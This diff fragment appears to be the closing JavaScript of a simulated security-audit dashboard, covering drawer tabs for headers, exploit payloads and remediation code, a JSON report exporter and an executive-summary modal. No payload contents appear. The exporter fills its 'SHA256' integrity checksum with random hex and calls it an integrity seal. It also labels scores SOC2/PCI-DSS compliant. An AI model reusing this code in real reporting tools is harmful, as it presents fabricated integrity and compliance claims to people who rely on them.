+    } else if (this.activeTab === 'headers') {
+      const sec = document.createElement('div');
+      sec.className = 'drawer-section';
+      sec.innerHTML = `
+        <div class="drawer-section-title">
+          <span>Evaluated Raw Request / Response Headers</span>
+          <span style="font-size: 0.7rem; color: var(--text-muted);">HTTP Protocol Probe</span>
+        </div>
+        <div class="code-block-wrap">
+          <button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.textContent); uiController.showToast('Copied headers to clipboard', 'info');">Copy</button>
+          <pre class="code-block">${this.escapeHtml(node.evaluatedHeaders)}</pre>
+        </div>
+      `;
+      this.contentEl.appendChild(sec);
+    } else if (this.activeTab === 'payloads') {
+      const sec = document.createElement('div');
+      sec.className = 'drawer-section';
+      sec.innerHTML = `
+        <div class="drawer-section-title">
+          <span>Automated Exploit & Verification Payloads</span>
+          <span style="font-size: 0.7rem; color: var(--cyan-cyber);">Proof-of-Concept</span>
+        </div>
+        <div class="code-block-wrap">
+          <button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.textContent); uiController.showToast('Copied payload to clipboard', 'info');">Copy</button>
+          <pre class="code-block">${this.escapeHtml(node.testPayload)}</pre>
+        </div>
+      `;
+      this.contentEl.appendChild(sec);
+    } else if (this.activeTab === 'remediation') {
+      const sec = document.createElement('div');
+      sec.className = 'drawer-section';
+      sec.innerHTML = `
+        <div class="drawer-section-title">
+          <span>Production Remediation Code (${node.remediationLang.toUpperCase()})</span>
+          <span style="font-size: 0.7rem; color: var(--green-neon);">Hardened Configuration</span>
+        </div>
+        <div class="code-block-wrap">
+          <button class="copy-btn" onclick="navigator.clipboard.writeText(this.nextElementSibling.textContent); uiController.showToast('Copied remediation snippet', 'success');">Copy</button>
+          <pre class="code-block">${this.escapeHtml(node.remediationCode)}</pre>
+        </div>
+      `;
+      this.contentEl.appendChild(sec);
+    }
+  }
+
+  escapeHtml(str) {
+    return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+}
+
+const drawerController = new DrawerController();
+
+// ==========================================
+// 8. REPORT & MODAL MANAGERS
+// ==========================================
+
+class ReportManager {
+  exportJson() {
+    const reportTimestamp = new Date().toISOString();
+    const score = state.calculateTotalScore();
+    const { grade, text } = gaugeController.getGrade(score);
+
+    const reportObj = {
+      reportId: `SEC-AUDIT-${Date.now().toString(36).toUpperCase()}`,
+      generatedAt: reportTimestamp,
+      integrityChecksum: `SHA256:${Array.from({ length: 32 }, () => Math.floor(Math.random()*16).toString(16)).join('')}`,
+      auditProfile: {
+        targetHost: 'https://api.cyber-core.internal',
+        scannerEngine: 'Depredador CyberSec Sentinel v4.2',
+        environment: 'Enterprise Cloud-Native Microservices Stack'
+      },
+      scoreSummary: {
+        score: score,
+        letterGrade: grade,
+        evaluationStatus: text,
+        totalNodesEvaluated: state.nodes.length,
+        patchedVulnerabilitiesCount: state.patchedNodeIds.size,
+        unpatchedCriticalCount: state.nodes.filter(n => n.severity === 'CRITICAL' && !state.isNodePatched(n.id)).length
+      },
+      evaluatedNodes: state.nodes.map(n => ({
+        id: n.id,
+        title: n.title,
+        category: n.category,
+        cve: n.cve,
+        cwe: n.cwe,
+        cvssScore: n.cvssScore,
+        severity: n.severity,
+        status: state.isNodePatched(n.id) ? 'PATCHED_SECURE' : (state.auditComplete ? 'VULNERABLE' : 'PENDING_SCAN'),
+        remediationMethod: n.remediationLang
+      }))
+    };
+
+    const jsonStr = JSON.stringify(reportObj, null, 2);
+    const blob = new Blob([jsonStr], { type: 'application/json' });
+    const url = URL.createObjectURL(blob);
+
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `security-audit-report-${Date.now()}.json`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+
+    logger.log('Exported JSON Compliance Report with SHA-256 integrity seal.', 'pass', 'EXPORT');
+    uiController.showToast('Downloaded JSON Audit Report', 'success');
+  }
+}
+
+const reportManager = new ReportManager();
+
+class SummaryModal {
+  constructor() {
+    this.modal = document.getElementById('execSummaryModal');
+    this.bindEvents();
+  }
+
+  bindEvents() {
+    document.getElementById('modalCloseBtn').addEventListener('click', () => this.close());
+    document.getElementById('modalDismissBtn').addEventListener('click', () => this.close());
+    document.getElementById('modalCopyBtn').addEventListener('click', () => this.copySummary());
+    document.getElementById('modalDownloadJsonBtn').addEventListener('click', () => {
+      reportManager.exportJson();
+    });
+
+    window.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && this.modal.classList.contains('open')) this.close();
+    });
+  }
+
+  open() {
+    const score = state.calculateTotalScore();
+    const { grade, text, color } = gaugeController.getGrade(score);
+
+    document.getElementById('modalScoreDisplay').textContent = `${score} / 100`;
+    const gradeBadge = document.getElementById('modalGradeDisplay');
+    gradeBadge.textContent = `GRADE ${grade} (${text})`;
+    gradeBadge.style.color = color;
+    gradeBadge.style.borderColor = color;
+    gradeBadge.style.background = `${color}22`;
+
+    document.getElementById('modalTimestamp').textContent = new Date().toUTCString();
+
+    // Summary cards update
+    const tlsPatched = state.isNodePatched('tls_audit');
+    const headersPatched = state.isNodePatched('headers_audit');
+    const corsPatched = state.isNodePatched('cors_audit');
+    const sqliPatched = state.isNodePatched('sqli_audit');
+    const jwtPatched = state.isNodePatched('jwt_audit');
+    const rbacPatched = state.isNodePatched('rbac_audit');
+
+    document.getElementById('sumTransport').textContent = tlsPatched 
+      ? '✓ TLS 1.3 & HSTS Preload Fully Hardened' 
+      : '⚠️ TLS 1.3 Active • HSTS Preload Missing (WARN)';
+
+    document.getElementById('sumSandboxing').textContent = (headersPatched && corsPatched)
+      ? '✓ Strict CSP & Origin Whitelist Enforced'
+      : '❌ CSP Missing • Clickjacking & CORS Wildcard Exposed';
+
+    document.getElementById('sumData').textContent = sqliPatched
+      ? '✓ Parameterized Prepared Statements Enforced'
+      : '❌ SQLi Unparameterized Search Endpoint Exposed';
+
+    document.getElementById('sumAuth').textContent = (jwtPatched && rbacPatched)
+      ? '✓ RS256 Verification & Multi-Tenant Guard Active'
+      : '❌ Alg: None Accepted • IDOR Tenant Leakage';
+
+    this.modal.classList.add('open');
+  }
+
+  close() {
+    this.modal.classList.remove('open');
+  }
+
+  copySummary() {
+    const score = state.calculateTotalScore();
+    const { grade, text } = gaugeController.getGrade(score);
+    const summaryText = `[CYBERSEC SENTINEL EXECUTIVE SUMMARY]
+Target: api.cyber-core.internal
+Overall Security Score: ${score}/100 (Grade: ${grade} - ${text})
+Evaluated Nodes: 7 | Patched: ${state.patchedNodeIds.size}
+Audit Date: ${new Date().toUTCString()}
+Compliance Status: ${score >= 95 ? 'PASSED (SOC2 / PCI-DSS)' : 'FAILED (Remediation Required)'}`;
+
+    navigator.clipboard.writeText(summaryText);
+    uiController.showToast('Copied Executive Summary to Clipboard', 'success');
+  }
+}
+
+const summaryModal = new SummaryModal();
+
+// ==========================================
+// 9. BOOTSTRAP APPLICATION
+// ==========================================
+
+document.addEventListener('DOMContentLoaded', () => {
+  uiController.init();
+});
+</script>
+
+</body>
+</html>
